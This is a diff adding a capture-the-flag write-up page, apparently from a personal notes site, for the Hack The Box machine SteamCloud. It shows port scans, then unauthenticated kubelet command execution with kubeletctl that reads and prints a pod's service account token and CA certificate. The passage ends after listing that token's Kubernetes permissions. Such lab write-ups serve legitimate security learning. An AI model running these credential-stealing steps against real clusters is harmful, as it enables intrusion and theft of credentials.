@@ -1,0 +1,905 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../Office/">
+      
+      
+        <link rel="next" href="../../../Others/Use%20WSL%20to%20Install%20Ubuntu%20on%20Windows%2011/">
+      
+      
+      <link rel="icon" href="../../../assets/images/logo.png">
+      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.4">
+    
+    
+      
+        <title>SteamCloud - Notes & Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.50c56a3b.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="green" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#steamcloud" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Notes &amp; Writeups" class="md-header__button md-logo" aria-label="Notes & Writeups" data-md-component="logo">
+      
+  <img src="../../../assets/images/logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Notes & Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              SteamCloud
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Notes &amp; Writeups" class="md-nav__button md-logo" aria-label="Notes & Writeups" data-md-component="logo">
+      
+  <img src="../../../assets/images/logo.png" alt="logo">
+
+    </a>
+    Notes & Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Welcome
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    HTB
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            HTB
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Machines
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Machines
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Jab/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Jab
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Monitored/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    [Protected] Monitored
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Office/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    [Protected] Office
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    SteamCloud
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    SteamCloud
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#yaml-file-used-to-deploy-a-new-pod" class="md-nav__link">
+    <span class="md-ellipsis">
+      .yaml file used to deploy a new pod
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Others
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Others
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Others/Use%20WSL%20to%20Install%20Ubuntu%20on%20Windows%2011/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Use WSL to Install Ubuntu on Windows 11
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#yaml-file-used-to-deploy-a-new-pod" class="md-nav__link">
+    <span class="md-ellipsis">
+      .yaml file used to deploy a new pod
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="steamcloud">SteamCloud</h1>
+<pre><code class="language-bash">└─$ sudo nmap 10.10.11.133 -p- --min-rate=10000 -T4 -Pn     
+PORT      STATE SERVICE
+22/tcp    open  ssh
+2379/tcp  open  etcd-client
+2380/tcp  open  etcd-server
+8443/tcp  open  https-alt
+10249/tcp open  unknown
+10250/tcp open  unknown
+10256/tcp open  unknown
+
+└─$ sudo nmap 10.10.11.133 -p 22,2379,2380,8443,10249,10250,10256 --min-rate=10000 -T4 -Pn -sCV
+PORT      STATE SERVICE          VERSION
+22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
+|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
+|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
+2379/tcp  open  ssl/etcd-client?
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  h2
+| ssl-cert: Subject: commonName=steamcloud
+| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
+| Not valid before: 2024-02-21T07:18:56
+|_Not valid after:  2025-02-20T07:18:56
+2380/tcp  open  ssl/etcd-server?
+| tls-alpn: 
+|_  h2
+| ssl-cert: Subject: commonName=steamcloud
+| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
+| Not valid before: 2024-02-21T07:18:56
+|_Not valid after:  2025-02-20T07:18:57
+|_ssl-date: TLS randomness does not represent time
+8443/tcp  open  ssl/https-alt
+| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
+| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
+| Not valid before: 2024-02-20T07:18:54
+|_Not valid after:  2027-02-20T07:18:54
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Site doesn't have a title (application/json).
+| tls-alpn: 
+|   h2
+|_  http/1.1
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 403 Forbidden
+|     Audit-Id: a090b496-a021-4484-8ec8-ab726ca9c2fd
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Kubernetes-Pf-Flowschema-Uid: e287085f-2ac9-4960-9104-714a75bececb
+|     X-Kubernetes-Pf-Prioritylevel-Uid: bb4b8c06-406d-4716-aab3-75211d4abf5b
+|     Date: Wed, 21 Feb 2024 07:27:47 GMT
+|     Content-Length: 212
+|     {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot get path &quot;/nice ports,/Trinity.txt.bak&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403}
+|   GetRequest: 
+|     HTTP/1.0 403 Forbidden
+|     Audit-Id: df87bc9b-49b9-47aa-9c22-437d2f7dd27d
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Kubernetes-Pf-Flowschema-Uid: e287085f-2ac9-4960-9104-714a75bececb
+|     X-Kubernetes-Pf-Prioritylevel-Uid: bb4b8c06-406d-4716-aab3-75211d4abf5b
+|     Date: Wed, 21 Feb 2024 07:27:46 GMT
+|     Content-Length: 185
+|     {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot get path &quot;/&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403}
+|   HTTPOptions: 
+|     HTTP/1.0 403 Forbidden
+|     Audit-Id: b612ac2d-ffe4-477e-9ca2-a5440c5e9151
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Kubernetes-Pf-Flowschema-Uid: e287085f-2ac9-4960-9104-714a75bececb
+|     X-Kubernetes-Pf-Prioritylevel-Uid: bb4b8c06-406d-4716-aab3-75211d4abf5b
+|     Date: Wed, 21 Feb 2024 07:27:46 GMT
+|     Content-Length: 189
+|_    {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot options path &quot;/&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403}
+10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+| ssl-cert: Subject: commonName=steamcloud@1708499939
+| Subject Alternative Name: DNS:steamcloud
+| Not valid before: 2024-02-21T06:18:59
+|_Not valid after:  2025-02-20T06:18:59
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+| tls-alpn: 
+|   h2
+|_  http/1.1
+10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+1 service unrecognized despite returning data. 
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+└─$ curl -k https://10.10.11.133:8443/ | jq
+{
+  &quot;kind&quot;: &quot;Status&quot;,
+  &quot;apiVersion&quot;: &quot;v1&quot;,
+  &quot;metadata&quot;: {},
+  &quot;status&quot;: &quot;Failure&quot;,
+  &quot;message&quot;: &quot;forbidden: User \&quot;system:anonymous\&quot; cannot get path \&quot;/\&quot;&quot;,
+  &quot;reason&quot;: &quot;Forbidden&quot;,
+  &quot;details&quot;: {},
+  &quot;code&quot;: 403
+}
+
+</code></pre>
+<p><strong><a href="https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/pentesting-kubernetes-services">Pentesting Kubernetes Services</a></strong></p>
+<p><strong><a href="https://github.com/cyberark/kubeletctl">kubeletctl:A client for kubelet</a></strong></p>
+<pre><code class="language-bash">└─$ ~/HTB/tools/kubeletctl_linux_amd64 pods --server 10.10.11.133
+┌────────────────────────────────────────────────────────────────────────────────┐
+│                                Pods from Kubelet                               │
+├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
+│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 1 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 2 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 4 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 5 │ storage-provisioner                │ kube-system │ storage-provisioner     │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 6 │ kube-proxy-k8tsh                   │ kube-system │ kube-proxy              │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 7 │ coredns-78fcd69978-xgmt7           │ kube-system │ coredns                 │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 8 │ nginx                              │ default     │ nginx                   │
+│   │                                    │             │                         │
+└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
+└─$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 scan --help
+Description:
+  Scans for nodes with opened kubelet's API.
+
+  Examples:
+    // It will find all nodes that have opened kubelet API
+    kubeletctl scan --cidr &quot;123.123.123.123/24&quot;
+
+Usage:
+  kubeletctl scan [flags]
+  kubeletctl scan [command]
+
+Available Commands:
+  rce         Scans for nodes with opened kubelet API
+  token       Scans for for all the tokens in a given Node.
+
+Flags:
+  -h, --help   help for scan
+
+Global Flags:
+      --cacert string       CA certificate (example: /etc/kubernetes/pki/ca.crt )
+      --cert string         Private key (example: /var/lib/kubelet/pki/kubelet-client-current.pem)
+      --cidr string         A network of IP addresses (Example: x.x.x.x/24)
+  -k, --config string       KubeConfig file
+  -c, --container string    Container name
+      --http                Use HTTP (default is HTTPS)
+  -i, --ignoreconfig        Ignore the default KUBECONFIG environment variable or location ~/.kube
+      --key string          Digital certificate (example: /var/lib/kubelet/pki/kubelet-client-current.pem)
+  -n, --namespace string    pod namespace
+  -p, --pod string          Pod name
+      --port string         Kubelet's port, default is 10250
+  -r, --raw                 Prints raw data
+  -s, --server string       Server address (format: x.x.x.x. For Example: 123.123.123.123)
+  -t, --token string        Service account Token (JWT) to insert
+  -f, --token-file string   Service account Token (JWT) file path
+  -u, --uid string          Pod UID
+
+└─$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 scan rce   
+┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                   Node with pods vulnerable to RCE                                  │
+├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
+│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│   │              │                                    │             │                         │ RUN │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 1 │ 10.10.11.133 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 2 │              │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 3 │              │ kube-proxy-k8tsh                   │ kube-system │ kube-proxy              │ +   │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 4 │              │ coredns-78fcd69978-xgmt7           │ kube-system │ coredns                 │ -   │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 5 │              │ nginx                              │ default     │ nginx                   │ +   │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 6 │              │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 7 │              │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 8 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
+└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
+</code></pre>
+<p><strong>nginx and kube-proxy-k8tsh pods can execute code remotely, but kube-proxy-k8tsh is a pod for proxy.</strong></p>
+<pre><code class="language-bash">└─$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'ls -la /var/run/secrets/kubernetes.io/serviceaccount/' -p nginx -c nginx
+total 4
+drwxrwxrwt 3 root root  140 Feb 21 07:20 .
+drwxr-xr-x 3 root root 4096 Feb 21 07:20 ..
+drwxr-xr-x 2 root root  100 Feb 21 07:20 ..2024_02_21_07_20_02.874347555
+lrwxrwxrwx 1 root root   31 Feb 21 07:20 ..data -&gt; ..2024_02_21_07_20_02.874347555
+lrwxrwxrwx 1 root root   13 Feb 21 07:20 ca.crt -&gt; ..data/ca.crt
+lrwxrwxrwx 1 root root   16 Feb 21 07:20 namespace -&gt; ..data/namespace
+lrwxrwxrwx 1 root root   12 Feb 21 07:20 token -&gt; ..data/token
+
+└─$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'cat /var/run/secrets/kubernetes.io/serviceaccount/token' -p nginx -c nginx
+eyJhbGciOiJSUzI1NiIsImtpZCI6IkNUUVE2ZFV6NXNoZEtWTGdYRDNQRU1FWXBnQ2RuQnBhZUo4YkNhelNrQVEifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzQwMDM2MDAyLCJpYXQiOjE3MDg1MDAwMDIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjJiMTk1Yjk2LWNiMTEtNDIyZi1iZDIwLTdlYTcyOTE3MmE5YSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImU5NGVhYjcwLWJkMDctNDkyMS05YWE2LWRlMWUyZDYyNGIxMSJ9LCJ3YXJuYWZ0ZXIiOjE3MDg1MDM2MDl9LCJuYmYiOjE3MDg1MDAwMDIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.nNVM9EnSiwvvFEB5BM9T5IDpn3aFagsOMoWt_xVQRSfyHNmereRX_g8zgKBZg920LI-M9u-UgORmY1VnfboOUfh-J_kykUSgnOA1hBA9suStwGPZxBEVU4tWwQ7lDZWLKFNdLsizovMo4wg90M3JdkQCl5q-MjVVAjwLLRwoLs2_3W5YcVqzFvKUeBx2300zbFmhgi6WWZIt6QLI0nw4rXo7zMTzgC4-kptvxX_HYFGxzR9eti-xV0QtAdH5uaaSKtUP8ZVRF4j4mu3ctPuImybkKYS_5_5kif_YQ0uPN63Yj5_9BTr1KISYBGIYGz6gC8vV2bwXr1qd6B-CiPiWAw
+
+└─$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt' -p nginx -c nginx
+-----BEGIN CERTIFICATE-----
+MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
+a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
+AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa
+YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M
+HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7
+deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG
+VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll
+hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o
+1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
+MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
+BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm
+lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO
+DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+
+9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D
+xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0
+JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz
+kf2eZIBNMp0TFg==
+-----END CERTIFICATE-----
+</code></pre>
+<pre><code class="language-bash">└─$ sudo kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 auth can-i --list
+Resources                                       Non-Resource URLs                     Resource Names   Verbs
+selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
+pods                                            []                                    []               [get create list]
+                                                [/.well-known/openid-configuration]   []               [get]
+                                                [/api/*]                              []               [get]
+                                                [/api]                                []               [get]
+                                                [/apis/*]                             []               [get]
+                                                [/apis]                               []               [get]
+                                                [/healthz]                            []               [get]
+                                                [/healthz]                            []               [get]
+                                                [/livez]                              []               [get]
+                                                [/livez]                              []               [get]
+                                                [/openapi/*]                          []               [get]
+                                                [/openapi]                            []               [get]
